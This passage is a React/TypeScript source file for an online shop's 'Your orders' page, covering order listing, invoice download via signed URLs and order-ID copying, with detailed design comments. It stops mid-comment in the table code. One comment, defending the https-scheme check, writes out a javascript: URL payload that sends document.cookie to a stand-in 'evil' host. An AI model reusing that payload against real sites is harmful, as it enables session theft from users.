import React, { useEffect, useRef, useState } from 'react';

import PageMeta from '../components/PageMeta';
import PageTopBand from '../components/PageTopBand';
import PillButton from '../components/PillButton';
import CheckoutIdentityCard from '../components/CheckoutIdentityCard';
import RequestsPanel from '../components/orders/RequestsPanel';
import CheckoutProfile, {
  type CheckoutProfileMode,
  type CheckoutProfileValue,
} from '../components/CheckoutProfile';
import { type StoredAddress } from '../components/AddressFields';
// The MODULE is the mockable seam, and the boolean is read as a property access INSIDE the
// render body - never captured in a module-scope const. An ESM const cannot be spied and
// vi.stubEnv runs strictly after module evaluation, which is exactly why API_BASE below is not
// overridable today. There is deliberately no local alias either: two names for one fact.
import { featureFlags } from '../config/featureFlags';
import { clearSession, getSession, restoreSession } from '../lib/customerAuth';
import { formatPaiseINR } from '../lib/money';

/**
 * /orders — what a customer has bought from us, and what each payment is doing.
 *
 * RENAMED FROM [retired public path] ON OWNER INSTRUCTION, label and URL together. UNVERIFIED IN
 * THIS PASS, and carried forward as a claim rather than restated as fact: the old path is
 * believed to 301 here from Amplify customRules written by a now-retired provisioning script,
 * and the same change repointed a FROZEN_EXTERNAL entry printed inside a DLT-approved SMS
 * template that cannot be edited. The route this page serves is unchanged by this rebuild, so
 * nothing here can break that redirect - but nobody re-measured it against the live Amplify app
 * while writing this, so do not treat the 301 as measured.
 *
 * FOUR REGISTRY LISTS HAVE TO AGREE OR THE SUITE FAILS. '/orders' must be in the EXACT-MATCH
 * allowlist in _app.tsx (:523) or this renders an empty body with HTTP 200 - a 404 that does not
 * look like one; in PUBLIC_EXACT in scripts/generate-sitemap.js (:44); and as both path and name
 * in config/public-pages.json (:107), whose description must stay BYTE-IDENTICAL to the one in
 * _app.tsx. trailingSlash means the URL is /orders/. All four are already in step and this
 * rebuild changes none of them.
 *
 * THE PAGE IS PUBLIC AND INDEXED, WHICH IS A CONSTRAINT ON THE FIRST RENDER. /orders is in
 * PUBLIC_PAGE_META, the sitemap allowlist and public-pages.json, and generate-sitemap.js refuses
 * a URL that is both allowlisted and blocked - so there is no noindex here, and the static export
 * is a real public page. The SERVER-RENDERED state is therefore `signedOut`: a useful page saying
 * what this is for plus the sign-in control, with no personal data. `loading` must never be the
 * first render, or the indexed headline would be "Loading…". The order list is client-only, which
 * is correct: it is per-person and must never sit in a static artifact.
 *
 * NO CODE IS SENT FROM THIS PAGE. The sign-in control is a LINK into the existing flow at
 * /account/sign-in/ (which owns all four of its phases, the two-codes-not-one registration path
 * and the owner's approved failure strings). Reimplementing any of that here is the one kind of
 * near-miss that is a sign-in outage. See the note on the gate below for why the label reads
 * "Sign in on WhatsApp".
 *
 * WHAT THIS PAGE DOES NOT CLAIM. It lists paid website orders, read from one bounded query over
 * the caller's own partition. It is not a tracker for a request or a booking, and the empty state
 * says so rather than asserting that nothing was bought - a captured payment can leave no order
 * row at all (finalization stages PURCHASED_SNAPSHOT_MISSING and returns before the order write),
 * and no later writer creates one. Phase 3 cannot repair that; the repair is on the money path.
 */

const API_BASE = process.env.NEXT_PUBLIC_API_BASE || 'https://wecare.digital/api';
const MY_ORDERS_URL = `${ API_BASE }/ecommerce/my-orders`;
const MY_INVOICE_URL = `${ API_BASE }/ecommerce/my-invoice`;

/**
 * How long after an empty FIRST page we ask once more. The arrival path that needs it is real:
 * cart.tsx's terminal rail links straight here after a payment, and the index is eventually
 * consistent, so a just-created order can be briefly absent. One extra read per visit, no poll.
 */
const RECHECK_DELAY_MS = 4000;

/** One page is 20 server-side; the request sends no `limit` and takes that default. */
interface OrderRow {
  orderNumber: string;
  referenceId: string;
  /** INT epoch SECONDS, UTC. Formatted in the browser so an IST reader sees their own day. */
  createdAt: number | null;
  amountPaise: number | null;
  currency: string;
  currencyUnexpected: boolean;
  /** payment_status canonical. '' when unmappable. Never a raw provider spelling. */
  status: string;
  /** On the wire for a future filter. Deliberately not read here. */
  statusRank: number;
}

interface ProfilePayload {
  name: string;
  firstName: string;
  lastName: string;
  email: string;
  emailVerified: boolean;
  phone: string;
  addressComplete: boolean;
  address: StoredAddress | null;
}

/**
 * `profile` is OPTIONAL on purpose, and the difference matters. It is PRESENT ONLY on a
 * first-page request: a response that carried a cursor OMITS the key entirely. So `undefined`
 * means "not answered on this request" and `null` means "no contact row, or a degraded read".
 * Treating `undefined` as `null` would blank the card the customer is looking at on page two.
 */
interface OrdersResponse {
  orders?: OrderRow[];
  cursor?: string;
  profile?: ProfilePayload | null;
}

type View = 'signedOut' | 'loading' | 'ready' | 'empty' | 'error';
type Failure = 'rate' | 'unavailable';

type Outcome =
  | { kind: 'ok'; data: OrdersResponse }
  | { kind: 'expired' }
  | { kind: 'rate' }
  | { kind: 'unavailable' };

/**
 * The §3.6 map, keyed on the CANONICAL word and nothing else. A lookup rather than a chain of
 * comparisons, which is the shape that cannot drift: the mapping from 'PAYMENT_PAID', 'paid' and
 * 'completed' happened once, on the server, in payment_status. Re-introducing any of those
 * spellings here would be the frontend starting a sixth vocabulary.
 */
const STATUS_LABEL: Record<string, string> = {
  captured: 'Paid',
  authorized: 'Payment held',
  pending: 'Payment confirming',
  created: 'Started',
  failed: 'Not paid',
  refunded: 'Refunded',
  disputed: 'Under review',
};

const STATUS_NOTE: Record<string, string> = {
  authorized: 'We are confirming this with the bank.',
  pending: 'This usually settles within a few minutes.',
  created: 'This order was started but not paid.',
  failed: 'No money was taken.',
  refunded: 'The amount has been returned.',
  disputed: 'We are looking into this payment with the bank.',
};

/** The two states that read as firm rather than advisory. A weight step, never a hue. */
const STATUS_FIRM = new Set( [ 'captured', 'refunded' ] );

/**
 * An ALIAS, never a second Set. The states that are financially settled are exactly the states
 * an invoice can exist for, so this is the same fact twice and not a coincidence worth
 * duplicating - two identical payment-vocabulary sets with nothing forcing them to agree is how
 * a vocabulary starts drifting. If they ever legitimately diverge (a rank that is firm but not
 * invoiceable), split them THEN and add a test naming the difference.
 */
const INVOICE_ELIGIBLE = STATUS_FIRM;

function dateLabel ( createdAt: number | null ): string {
  if ( createdAt === null || !Number.isFinite( createdAt ) ) return '';
  return new Date( createdAt * 1000 )
    .toLocaleDateString( 'en-IN', { day: 'numeric', month: 'short', year: 'numeric' } );
}

/**
 * The column shows a short date; the detail panel is where the time belongs. Same refusal as
 * `dateLabel`: an unreadable `createdAt` renders nothing rather than "Invalid Date".
 */
function dateTimeLabel ( createdAt: number | null ): string {
  if ( createdAt === null || !Number.isFinite( createdAt ) ) return '';
  return new Date( createdAt * 1000 ).toLocaleString( 'en-IN', {
    day: 'numeric', month: 'short', year: 'numeric', hour: 'numeric', minute: '2-digit',
  } );
}

/**
 * The key for the VIEW state - expansion and the copy hint. A pure module-scope function, which
 * the styled-jsx rule permits (only JSX may not be hoisted out of the return tree).
 *
 * It is NEVER empty, which is the whole reason it is separate from the invoice map's key: a row
 * with no `orderNumber` and no `referenceId` still has a date, an amount and a status worth
 * reading, so it must still be expandable. Behaviourally identical to the old React key
 * (`referenceId || orderNumber || index`) - only the final fallback differs, and both are unique
 * among siblings, which is all a key must be.
 */
const rowKey = ( order: OrderRow, index: number ) =>
  order.referenceId || order.orderNumber || `row-${ index }`;

/** Per-row invoice state. Transient; the column carries it, the panel never echoes it. */
type InvoiceState = 'idle' | 'busy' | 'none' | 'failed' | 'rate';

/**
 * `fetchInvoiceUrl`'s return type, and `kind` is NOT the same vocabulary as `InvoiceState`:
 * 'ok' is an outcome with no resting state (the row returns to 'idle' once the download fires)
 * and 'expired' never becomes a cell at all, because it unmounts the table. Keeping the two
 * separate is what stops a later edit rendering a cell for an outcome that has no cell.
 */
type InvoiceOutcome =
  | { kind: 'ok'; url: string }
  | { kind: 'none' }        // available:false, 400, 403, 404, or a 200 that is not JSON - terminal
  | { kind: 'rate' }        // 429
  | { kind: 'failed' }      // !response.ok, a network rejection, or an unsigned url
  | { kind: 'expired' };    // 401 - the caller runs expire(); it never reaches a cell

/**
 * Mirrors `receipt_links.is_permanent_public_url`'s own marker set
 * (lambda_utils/receipt_links.py), so the two sides cannot drift when the signer changes.
 */
const SIGNED_MARKERS = [ 'X-Amz-Signature=', 'X-Amz-Credential=', 'Signature=', 'Expires=' ];

/**
 * A TYPE PREDICATE (`url is string`), not a boolean, and the signature is load-bearing: the
 * caller assigns the guarded value straight into InvoiceOutcome's `ok` arm, which is
 * `{ kind: 'ok'; url: string }`. A boolean-returning guard narrows nothing, so `body.url` would
 * still be `unknown` at the return and `tsc --noEmit` under strict would fail TS2322.
 *
 * WHY THE SCHEME IS TESTED AND NOT JUST THE SIGNATURE. The value is assigned to `a.href` and
 * then clicked, so it is an execution surface rather than just a link. A marker-only predicate
 * accepts `javascript:void(fetch('https://evil/?c='+document.cookie))` with an `Expires=`
 * comment stapled on, and clicking an anchor with a javascript: href runs it in this origin,
 * where the customer's session lives. The server's `assert_not_permanent` is no help here:
 * `is_permanent_public_url` returns False for anything not starting with 'http', so it passes a
 * non-http string THROUGH as "not permanent". `http://` is excluded too - a signed URL over
 * plaintext hands the grant to any observer, and S3 presigned URLs are https in this account.
 */
function isSignedHttpsUrl ( url: unknown ): url is string {
  return typeof url === 'string'
    && url.startsWith( 'https://' )
    && SIGNED_MARKERS.some( marker => url.includes( marker ) );
}

/**
 * This function's BODY IS the error table, which is why it is written out rather than delegating
 * to a guard somewhere else: the terminal-status set is spelled exactly once, here.
 *
 * 400, 403 and 404 are terminal rather than retryable, and none of the three is clearable by
 * clicking: a 400 is a defect in the body we just built and a retry re-sends it byte-identical,
 * a 403 is a missing or mis-qualified grant, and a 404 means the route is not where we think it
 * is. A 200 whose body is not JSON says the same thing. An affordance that invites a loop it can
 * never win is worse than a flat statement.
 *
 * Nothing on this path logs. The URL is a bearer grant.
 */
async function fetchInvoiceUrl (
  token: string, referenceId: string, createdAt: number,
): Promise<InvoiceOutcome> {
  let response: Response;
  try
  {
    response = await fetch( MY_INVOICE_URL, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: `Bearer ${ token }` },
      body: JSON.stringify( { referenceId, createdAt, format: 'png' } ),
    } );
  }
  catch
  {
    return { kind: 'failed' };          // network rejection - recoverable, offers Try again
  }

  if ( response.status === 401 ) return { kind: 'expired' };
  if ( response.status === 429 ) return { kind: 'rate' };
  if ( response.status === 400 || response.status === 403 || response.status === 404 )
  {
    return { kind: 'none' };
  }
  if ( !response.ok ) return { kind: 'failed' };   // 5xx and anything else - recoverable

  let data: unknown;
  try { data = await response.json(); }
  catch { return { kind: 'none' }; }

  const body = ( data ?? {} ) as { available?: unknown; url?: unknown };
  if ( body.available !== true ) return { kind: 'none' };
  if ( !isSignedHttpsUrl( body.url ) ) return { kind: 'failed' };
  return { kind: 'ok', url: body.url };
}

/**
 * Only ever called with an outcome of kind 'ok', i.e. a url that already passed
 * `isSignedHttpsUrl` inside `fetchInvoiceUrl` - so the guard runs BEFORE createElement and the
 * element never exists carrying an unvalidated href.
 *
 * THERE IS NO `download` ATTRIBUTE, and that is a decision. `receipt_links.signed_url` bakes
 * `attachment; filename="..."` INTO the signature, so S3 already returns the header that makes
 * the browser download rather than navigate, under the server's own sanitised name. The
 * attribute would be a second, unverified source of truth for the same fact - and `download` is
 * same-origin-only, so a cross-origin response (which a presigned S3 URL is) makes the browser
 * ignore it and honour Content-Disposition anyway. The downloaded file's name is owned entirely
 * by the Lambda, which is also where the sanitisation lives.
 *
 * A synthetic anchor rather than `location.assign`: deterministic, keeps the page mounted, and
 * directly assertable by spying on HTMLAnchorElement.prototype.click. Rejected: rendering a real
 * <a href> after a successful fetch - two taps for a one-tap action, and it would leave a live
 * bearer grant sitting in the DOM.
 */
function triggerDownload ( url: string ) {
  const anchor = document.createElement( 'a' );
  anchor.href = url;
  anchor.rel = 'noopener';
  document.body.appendChild( anchor );
  anchor.click();
  anchor.remove();
}

/**
 * The refused-clipboard recovery, and IT CANNOT THROW - it runs inside `copyId`'s catch arm, so
 * an exception here would break the only recovery that path has. jsdom implements
 * createRange/getSelection only partially and a real browser can return null from
 * getSelection() in a detached context, so every step is optional-chained inside one try. The
 * worst case is that the text is not selected, which still leaves the hint and the announcement.
 */
function selectText ( el: HTMLElement | null ) {
  if ( !el ) return;
  try
  {
    const range = document.createRange();
    range.selectNodeContents( el );
    const selection = window.getSelection?.();
    if ( !selection ) return;
    selection.removeAllRanges();
    selection.addRange( range );
  }
  catch
  {
    /* Selection is unavailable. The hint and the live region still carry the recovery. */
  }
}

async function fetchOrders ( token: string, cursor: string ): Promise<Outcome> {
  try
  {
    const response = await fetch( MY_ORDERS_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
        Authorization: `Bearer ${ token }`,
      },
      // The body allowlist is {limit, cursor} and nothing else - any other key is a 400.
      body: JSON.stringify( cursor ? { cursor } : {} ),
    } );
    // A 401 is the normal end of an hour-long token, not a fault. It is handled as a return to
    // the signed-out state with the expiry line, never as the error state.
    if ( response.status === 401 ) return { kind: 'expired' };
    if ( response.status === 429 ) return { kind: 'rate' };
    if ( !response.ok ) return { kind: 'unavailable' };
    const data = ( await response.json() ) as OrdersResponse;
    return { kind: 'ok', data };
  }
  catch
  {
    return { kind: 'unavailable' };
  }
}

export default function OrdersPage (): React.ReactElement {
  const [ view, setView ] = useState<View>( 'signedOut' );
  const [ failure, setFailure ] = useState<Failure>( 'unavailable' );
  const [ expired, setExpired ] = useState( false );
  const [ token, setToken ] = useState( '' );
  const [ orders, setOrders ] = useState<OrderRow[]>( [] );
  const [ cursor, setCursor ] = useState( '' );
  const [ profile, setProfile ] = useState<ProfilePayload | null>( null );
  const [ rechecked, setRechecked ] = useState( false );
  const [ loadingMore, setLoadingMore ] = useState( false );
  const [ moreFailed, setMoreFailed ] = useState( false );
  const [ showProfile, setShowProfile ] = useState( false );
  const [ profileMode, setProfileMode ] = useState<CheckoutProfileMode>( 'name' );

  /** Which detail panels are open. Many at once, deliberately - see `toggleRow`. */
  const [ openRows, setOpenRows ] = useState<Record<string, boolean>>( {} );
  /** Keyed on `order.referenceId`, written by `downloadInvoice` and read in the row locals. */
  const [ invoiceState, setInvoiceState ] = useState<Record<string, InvoiceState>>( {} );
  const [ copiedKey, setCopiedKey ] = useState<string | null>( null );
  const [ copyFailedKey, setCopyFailedKey ] = useState<string | null>( null );
  const [ liveMessage, setLiveMessage ] = useState( '' );
  const [ canCopy, setCanCopy ] = useState( false );

  const liveRef = useRef( true );
  useEffect( () => () => { liveRef.current = false; }, [] );

  /**
   * A clipboard write needs a secure context, and the button must not exist where it cannot
   * work. Computed in an EFFECT and never during render, so the server-rendered signedOut shell
   * and the first client paint agree.
   */
  useEffect( () => {
    setCanCopy(
      typeof navigator !== 'undefined' && !!navigator.clipboard && window.isSecureContext );
  }, [] );

  /**
   * ONE timer for the whole table, not one per row. Consequence, stated rather than discovered:
   * copying row B while row A still reads "Copied" clears A's hint immediately. That is wanted -
   * two rows both claiming "Copied" when only the last one is on the clipboard would be a lie -
   * but it is a choice, and it is why a ref-per-row map was rejected along with its bookkeeping.
   */
  const copyTimer = useRef<ReturnType<typeof setTimeout> | null>( null );

  const restartTimer = ( fn: () => void, ms = 2000 ) => {
    if ( copyTimer.current ) clearTimeout( copyTimer.current );
    copyTimer.current = setTimeout( fn, ms );
  };

  // The expiry path unmounts the table while a timer may still be pending, and setState on an
  // unmounted tree is the warning this cleanup exists to avoid.
  useEffect( () => () => { if ( copyTimer.current ) clearTimeout( copyTimer.current ); }, [] );

  /**
   * The parameter is `rowId` and not `key`, and the name is the point: there are two keyers in
   * the row callback - `rowId` (never empty, keys the view state) and `invoiceKey`
   * (`order.referenceId`, may be `''`, keys the request state). `key` was the overloaded name
   * that let one identifier stand for both, and the read then used the wrong one of the pair.
   */
  const toggleRow = ( rowId: string ) =>
    setOpenRows( prev => ( { ...prev, [ rowId ]: !prev[ rowId ] } ) );

  /**
   * WHAT IS COPIED COMES FROM REACT STATE, NEVER FROM THE DOM. SupportWidget rewrites text nodes
   * for translation, so reading the rendered node could copy a transformed string into a support
   * ticket. The id span keeps `data-wc-no-translate` for the same reason; the two defences are
   * independent.
   *
   * BOTH ARMS CLEAR THE OTHER KEY. Clearing neither is a compounding bug: one refused write
   * would leave "Press your copy key" on that row permanently, and a later successful copy would
   * read "Copied" for two seconds and then REVERT to the failure wording, because the hint's
   * ternary falls through to `copyFailedKey` the moment `copiedKey` goes back to null.
   */
  const copyId = async ( rowId: string, value: string, index: number ) => {
    try
    {
      await navigator.clipboard.writeText( value );
      setCopiedKey( rowId );
      setCopyFailedKey( null );
      setLiveMessage( 'Order ID copied' );        // no identifier in the announcement
      restartTimer( () => { setCopiedKey( null ); setLiveMessage( '' ); } );
    }
    catch
    {
      // A rejected write is normally a denied permission. Saying nothing would leave the
      // customer pressing a dead button, so the id is SELECTED and they can copy it with the
      // keyboard - a real recovery rather than an apology.
      selectText( document.getElementById( `ord-id-${ index }` ) );
      setCopyFailedKey( rowId );
      setCopiedKey( null );
      setLiveMessage( 'Order ID selected. Copy it with your keyboard.' );
      // DELIBERATELY NO TIMER. This hint is an INSTRUCTION about a selection that is still on
      // screen, so it must last as long as that selection does. It is cleared by the next
      // successful copy on any row, which is the only event that makes it untrue.
    }
  };

  /**
   * One switch over the outcome, and the `default` arm is the exhaustiveness MECHANISM rather
   * than decoration. TypeScript checks a switch for exhaustiveness only when something forces
   * it; this function returns Promise<void> and nothing consumes the switch, so without
   * `const unhandled: never = outcome` a sixth outcome compiles clean and leaves the row stuck
   * on 'busy' forever. `void unhandled` is there so the binding is not an unused local.
   */
  const downloadInvoice = async ( order: OrderRow ) => {
    // The map's key. SAME NAME and same expression as the row callback's local, deliberately:
    // this writes the map and the render reads it, so one grep finds both sides.
    const invoiceKey = order.referenceId;
    if ( !token || !invoiceKey || !Number.isInteger( order.createdAt ) ) return;
    setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'busy' } ) );
    const outcome = await fetchInvoiceUrl( token, invoiceKey, order.createdAt as number );
    if ( !liveRef.current ) return;
    switch ( outcome.kind )
    {
      case 'expired': expire(); return;           // unmounts the table; no row state to set
      case 'ok':
        triggerDownload( outcome.url );
        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'idle' } ) );
        return;
      case 'none':
        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'none' } ) );
        return;
      case 'rate':
        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'rate' } ) );
        return;
      case 'failed':
        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'failed' } ) );
        return;
      default: { const unhandled: never = outcome; void unhandled; return; }
    }
  };

  /**
   * The 4-second window is DERIVED, not stored. A boolean set from inside an effect is the
   * react-hooks/set-state-in-effect shape PageTopBand works around with a timeout; there is
   * nothing to store here, because "we are between an empty first page and its one re-ask" is
   * exactly `view === 'empty' && !rechecked`.
   */
  const checking = view === 'empty' && !rechecked && !!token;

  const expire = () => {
    clearSession();
    setToken( '' );
    setOrders( [] );
    setCursor( '' );
    setProfile( null );
    setExpired( true );
    setView( 'signedOut' );
  };

  const applyFirstPage = ( data: OrdersResponse ) => {
    const rows = data.orders || [];
    setOrders( rows );
    setCursor( String( data.cursor || '' ) );
    // A first page always answers `profile`, so reading it unconditionally here is correct.
    // `?? null` and not `|| null`: the key is present, and `null` is a meaningful value.
    if ( 'profile' in data ) setProfile( data.profile ?? null );
    setView( rows.length === 0 ? 'empty' : 'ready' );
  };

  const applyFailure = ( kind: Failure ) => {
    setFailure( kind );
    setView( 'error' );
  };

  // The mount effect. `signedOut` is already rendered, so the only job is to find a session and
  // move off it. restoreSession's rejection is swallowed into `signedOut` rather than into the
  // error state: a failed silent refresh is not something the customer did.
  useEffect( () => {
    let live = true;
    ( async () => {
      let session = getSession();
      if ( !session )
      {
        try { session = await restoreSession(); }
        catch { /* stay signedOut */ }
      }
      if ( !live ) return;
      if ( !session ) return;
      setToken( session.accessToken );
      setView( 'loading' );
      const outcome = await fetchOrders( session.accessToken, '' );
      if ( !live ) return;
      if ( outcome.kind === 'ok' ) applyFirstPage( outcome.data );
      else if ( outcome.kind === 'expired' ) expire();
      else applyFailure( outcome.kind );
    } )();
    return () => { live = false; };
  }, [] );

  /**
   * The one-shot re-ask, in its own effect WITH a clearTimeout cleanup. Without the cleanup,
   * leaving the page inside the window still fires a request against a token the page no longer
   * holds and then sets state on an unmounted tree. Keyed on `view === 'empty'`, which is a
   * FIRST-PAGE condition: an empty page returned from a cursor leaves `view` at 'ready' and so
   * cannot enter this branch, which is exactly the distinction between "I have nothing" and "I
   * reached the end of a page".
   */
  useEffect( () => {
    if ( view !== 'empty' || rechecked || !token ) return undefined;
    let live = true;
    const timer = window.setTimeout( () => {
      ( async () => {
        const outcome = await fetchOrders( token, '' );
        if ( !live ) return;
        setRechecked( true );
        if ( outcome.kind === 'ok' ) applyFirstPage( outcome.data );
        else if ( outcome.kind === 'expired' ) expire();
        else applyFailure( outcome.kind );
      } )();
    }, RECHECK_DELAY_MS );
    return () => { live = false; window.clearTimeout( timer ); };
  }, [ view, rechecked, token ] );

  const loadMore = async () => {
    if ( !token || !cursor || loadingMore ) return;
    setLoadingMore( true );
    setMoreFailed( false );
    const outcome = await fetchOrders( token, cursor );
    if ( !liveRef.current ) return;
    setLoadingMore( false );
    if ( outcome.kind === 'expired' ) { expire(); return; }
    if ( outcome.kind !== 'ok' )
    {
      // The rows already on screen stay, and so does the button, so a second tap retries. An
      // error view here would throw away a list the customer is reading over a pagination hiccup.
      setMoreFailed( true );
      return;
    }
    const rows = outcome.data.orders || [];
    setOrders( prev => [ ...prev, ...rows ] );
    // An empty cursored page appends nothing and drops the button, silently: DynamoDB hands out
    // a cursor whenever a query stops at Limit, so a customer with exactly 20 orders gets one.
    // There is no "no more orders" message, because there is nothing to tell them.
    setCursor( String( outcome.data.cursor || '' ) );
    // A cursored response OMITS `profile`. Touching the card on a key that is not there would
    // blank an identity the customer is looking at.
    if ( 'profile' in outcome.data ) setProfile( outcome.data.profile ?? null );
  };

  /**
   * THE FLAG COMES FROM THE MODE THAT COMPLETED, NEVER FROM `saved`.
   *
   * CheckoutProfileValue has NO `emailVerified` member (CheckoutProfile.tsx:39-48). Spreading
   * `saved` into the card's `identity` therefore leaves it `undefined`, `undefined !== false` is
   * true, and the "✓ verified" badge returns over an email nothing verified - on a page whose
   * server-side predicate deliberately does not prove the email at all.
   *
   * The asymmetry is load-bearing rather than tidy: mode 'email' completes only after a fresh
   * code bound to the NEW address, so it should flip the flag true; 'name' and 'address' post
   * with no code at all and must leave it exactly as it was. The mode is read from page state,
   * which is where the affordance put it, rather than inferred from the saved value.
   */
  const applyProfile = ( saved: CheckoutProfileValue, mode: CheckoutProfileMode ) => {
    setProfile( prev => ( prev && {
      ...prev,
      name: saved.name,
      firstName: saved.firstName,
      lastName: saved.lastName,
      email: saved.email,
      address: saved.address,
      addressComplete: saved.addressComplete,
      emailVerified: mode === 'email' ? true : ( prev?.emailVerified ?? false ),
    } ) );
  };

  const openEditor = ( mode: CheckoutProfileMode ) => {
    setProfileMode( mode );
    setShowProfile( true );
  };

  const signedIn = view === 'ready' || view === 'empty';

  return (
    <>
      <PageMeta
        title="Your orders — WECARE.DIGITAL"
        description="Sign in on WhatsApp to see what you have bought from WECARE.DIGITAL, each order's payment status, and the details we have on file."
        path="/orders/"
      />
      <PageTopBand
        heading="Your orders"
        sub="What you have bought from us, and what each payment is doing."
        ariaLabel="Your orders"
      >
        { /* The band owns the h1, the <main>, both header clearances, the measure, the gutters
             and the 'Inter' stack. Nothing below re-declares any of them, and nothing
             conversion-shaped - no button, link or price - goes inside the band itself. */ }
        <div className="ord-page">
          { view === 'signedOut' && (
            <div className="ord-gate">
              { expired && (
                <p className="ord-notice" role="status">
                  Your sign-in has expired. Sign in again to see your orders.
                </p>
              ) }
              <p className="ord-p">Sign in on your WhatsApp number to see your orders.</p>
              { /* A LINK, and the label says so. "Send OTP on WhatsApp" belongs on a control
                   that sends a code; this one navigates, and a customer tapping it would
                   otherwise be told a code was sent, receive none, and then be asked for their
                   number on the next screen. /orders/ is in safeReturnPath's ALLOWED set, so the
                   return survives rather than falling back to /cart/. PillButton renders ONLY
                   `action`, so this string is both the visible text and the accessible name. */ }
              <PillButton
                as="a"
                href="/account/sign-in/?return=/orders/"
                action="Sign in on WhatsApp"
              />
            </div>
          ) }

          { view === 'loading' && (
            <p className="ord-p" role="status">Loading your orders…</p>
          ) }

          { view === 'error' && (
            <div className="ord-gate">
              <p className="ord-notice" role="status">
                { failure === 'rate'
                  ? 'Too many requests. Wait a moment and try again.'
                  : 'We could not load your orders just now. Try again shortly.' }
              </p>
              <button
                type="button"
                className="ord-quiet"
                onClick={ () => {
                  if ( !token ) return;
                  setView( 'loading' );
                  ( async () => {
                    const outcome = await fetchOrders( token, '' );
                    if ( !liveRef.current ) return;
                    if ( outcome.kind === 'ok' ) applyFirstPage( outcome.data );
                    else if ( outcome.kind === 'expired' ) expire();
                    else applyFailure( outcome.kind );
                  } )();
                } }
              >
                Try again
              </button>
            </div>
          ) }

          { signedIn && (
            // The two-column shell. One column by default and 340px + minmax(0,1fr) from
            // 1024px up, collapsing back to one while the profile editor is open - see the
            // .ord-shell-editing note in the stylesheet. DOM order equals visual order at
            // every width, so there is no `order:` property and no reading-order divergence.
            <div className={ showProfile ? 'ord-shell ord-shell-editing' : 'ord-shell' }>
              { /* LEFT: the profile panel. It adds NO heading of its own - the rendered h2
                   list must stay exactly ['What we have on file', 'Your requests', 'Order history'] (the
                   middle one is RequestsPanel's, Phase O-1), so the
                   panel is named by aria-label and the only heading in it is the one
                   CheckoutIdentityCard already owns.

                   Exactly three edit affordances, and the PHONE IS NOT ONE OF THEM. That is
                   structural rather than a convention this page keeps: CheckoutIdentityCard
                   declares no onEditPhone prop and CheckoutProfileMode has no 'phone'
                   member. The phone IS the WhatsApp-OTP identity and the card's
                   "✓ verified" badge is unconditional because of it, so a self-service
                   phone edit would let a signed-in session rewrite the credential it was
                   issued against - and would make that badge a false claim. */ }
              <aside className="ord-panel" aria-label="Your details">
                { profile
                  ? (
                    <CheckoutIdentityCard
                      identity={ {
                        name: profile.name,
                        email: profile.email,
                        phone: profile.phone,
                        // An incomplete address is not an address on file, so the row says so
                        // rather than showing a partial line as if it were the delivery address.
                        address: profile.addressComplete ? profile.address : null,
                        emailVerified: profile.emailVerified,
                      } }
                      eyebrow="Your details"
                      title="What we have on file"
                      emptyAddressLabel="No address on file"
                      editorOpen={ showProfile }
                      onEditName={ () => openEditor( 'name' ) }
                      onChangeEmail={ () => openEditor( 'email' ) }
                      onEditAddress={ () => openEditor( 'address' ) }
                    />
                  )
                  : (
                    // Four empty rows would assert we know nothing while looking like we know
                    // something. One line and a route to where the create-mode form lives.
                    <p className="ord-p ord-nodetails">
                      We do not have your details yet. You can add them in your{ ' ' }
                      { /* A plain anchor, not next/link, for the reason Footer.tsx documents:
                           styled-jsx does not scope composite components, so a Link carrying
                           ord-link would arrive with no styling at all. */ }
                      { /* eslint-disable-next-line @next/next/no-html-link-for-pages */ }
                      <a className="ord-link" href="/cart/">cart</a>.
                    </p>
                  ) }
                { showProfile && profile && (
                  <CheckoutProfile
                    accessToken={ token }
                    mode={ profileMode }
                    initial={ {
                      firstName: profile.firstName,
                      lastName: profile.lastName,
                      email: profile.email,
                      address: profile.address,
                    } }
                    onReady={ saved => {
                      applyProfile( saved, profileMode );
                      setShowProfile( false );
                    } }
                  />
                ) }
                { /* Phase O-1: the customer's service requests. Paid orders' references are
                     passed so the server can create a request whose webhook hint was missed. */ }
                <RequestsPanel
                  accessToken={ token }
                  paidReferenceIds={ orders
                    .filter( order => INVOICE_ELIGIBLE.has( order.status ) && order.referenceId )
                    .map( order => order.referenceId ) }
                  onExpired={ expire }
                />
              </aside>

              { /* RIGHT: the order history. The list and the empty state are alternatives and
                   never render together. */ }
              <div className="ord-main">
          { orders.length > 0 && (
            <section className="ord-list" aria-labelledby="ord-history">
              <h2 className="ord-h2" id="ord-history">Order history</h2>

              { /* ONE REAL TABLE AT EVERY WIDTH, with no display:block re-flow - that strips
                   table semantics in several screen readers, which would trade the owner's
                   "proper table" for something worse than the definition list it replaced.
                   The 280px objection is answered by this scroll container plus the shell's
                   minmax(0,1fr), which together keep documentElement.scrollWidth - vw at 0.

                   tabIndex={0} is what lets a keyboard user scroll the region (WCAG 2.1.1). It
                   adds one tab stop, which is the accepted cost. It is also the deliberate
                   exception to the hairline split: a 1px border with no hover treatment at all,
                   whose focus cue is the 3px outline. */ }
              <div
                className="ord-tablewrap"
                role="region"
                aria-labelledby="ord-history"
                tabIndex={ 0 }
              >
                <table className="ord-table">
                  <thead>
                    <tr>
                      { /* Exactly five. Not uppercase and not letter-spaced - this is the
                           page's own 12px/700/#1a3a2a label rung, which is literally the old
                           definition-list <dt> re-laid-out. */ }
                      <th scope="col" className="ord-th">Order #</th>
                      <th scope="col" className="ord-th ord-col-date">Date</th>
                      <th scope="col" className="ord-th ord-th-num">Amount</th>
                      <th scope="col" className="ord-th">Status</th>
                      <th scope="col" className="ord-th">Invoice</th>
                    </tr>
                  </thead>
                  <tbody>
                    { orders.map( ( order, index ) => {
                      // TWO KEYERS FOR TWO MAPS, named separately. `rowId` is view state and is
                      // never empty; `invoiceKey` is request state and is '' when there is
                      // nothing to ask for. One local serving both is the shape that let a read
                      // use the wrong one of the pair and stay correct only by coincidence of
                      // render ordering. No identifier on this page is named `key`.
                      const rowId = rowKey( order, index );
                      const invoiceKey = order.referenceId;
                      const date = dateLabel( order.createdAt );
                      // The ONE ladder for the visible text, the row header's accessible name
                      // and the copy button's label, so those three cannot disagree.
                      const displayId =
                        order.orderNumber || order.referenceId || date || '';
                      // Deliberately NOT the same ladder: it stops at the two real identifiers
                      // and never falls through to the date, because copying a date into a
